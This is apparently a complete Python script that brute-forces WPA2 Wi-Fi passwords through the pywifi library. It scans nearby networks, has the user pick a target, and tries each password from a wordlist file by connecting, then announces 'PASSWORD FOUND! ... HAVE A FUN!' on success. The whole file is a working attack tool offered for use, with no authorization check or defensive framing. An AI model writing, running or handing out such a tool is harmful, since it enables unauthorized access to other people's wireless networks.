import pywifi
import time
import signal
import argparse
from pywifi import const

INFO = "\033[94m"
SUCCESS = "\033[92m"
ERROR = "\033[91m"
RESET = "\033[0m"

parser = argparse.ArgumentParser()
parser.add_argument("ct", type=int, help="Connecting time to WiFi (Recommended 4)", default=None, nargs="?")
args = parser.parse_args()

wifi = pywifi.PyWiFi()

try:
    iface = wifi.interfaces()[0]
except IndexError:
    print(f"{ERROR}Your WiFi device is not connected.")
    exit()

iface.disconnect()
time.sleep(1)

# Configuration
profile = pywifi.Profile()
profile.auth = const.AUTH_ALG_OPEN
profile.akm.append(const.AKM_TYPE_WPA2PSK)
profile.cipher = const.CIPHER_TYPE_CCMP

iface.remove_all_network_profiles()

class WiFiManager:
    def scan():
        iface.scan()
        time.sleep(4)
        networks = iface.scan_results()
        wifi_list = []

        if not networks:
            print(f"{ERROR}No networks found.")

        for i, network in enumerate(networks):
            ssid = network.ssid if network.ssid else "Hidden_Network"
            signal = network.signal
            wifi_list.append((ssid, network.bssid, signal))

            print(f"{i + 1}. {ssid.ljust(25)}...{signal}% ({network.bssid})")

        try:
            wifiNumber = int(input(f"{INFO}Enter number of WiFi (1-{len(wifi_list)}): ")) - 1
        except ValueError:
            print(f"{ERROR}Please enter a number.{RESET}")
            return WiFiManager.scan()

        return str(wifi_list[wifiNumber][0])

def askParams():
    try:
        connectingTime = int(input(f"{INFO}Enter connecting time in seconds: {RESET}"))
    except ValueError:
        print(f"{ERROR}Please enter a number.{RESET}")
        return askParams()
    return connectingTime

def bruteWifi(conTime):
    try:
        profile.ssid = WiFiManager.scan()
        print(f"Selected WiFi: {profile.ssid}")
        with open("passwords.txt") as passwords:
            for password in passwords:
                password = password.strip()
                if not password or len(password.strip()) < 8: # Checking that password is not empty and not less than 8 digits
                    continue

                profile.key = password
                tmp_profile = iface.add_network_profile(profile)

                iface.connect(tmp_profile)
                time.sleep(conTime) # Recommended 4

                if iface.status() == const.IFACE_CONNECTED:
                    print(f"{SUCCESS}[+] PASSWORD FOUND!\nPassword: {password}\nSSID: {profile.ssid}\nHAVE A FUN!")
                    break
                else:
                    print(f"{INFO}[-] Password {password} is wrong.")
                    iface.remove_network_profile(tmp_profile)
                    time.sleep(0.1)
                    continue

    except KeyboardInterrupt:
        exit(0)
    except FileNotFoundError:
        print(f"{ERROR}There is no file with passwords.")
    except Exception as e:
        print(f"{ERROR}Error: {e}")

if __name__ == "__main__":
    if args.ct:
        bruteWifi(args.ct)
    else:
        connectingTime = askParams()
        bruteWifi(connectingTime)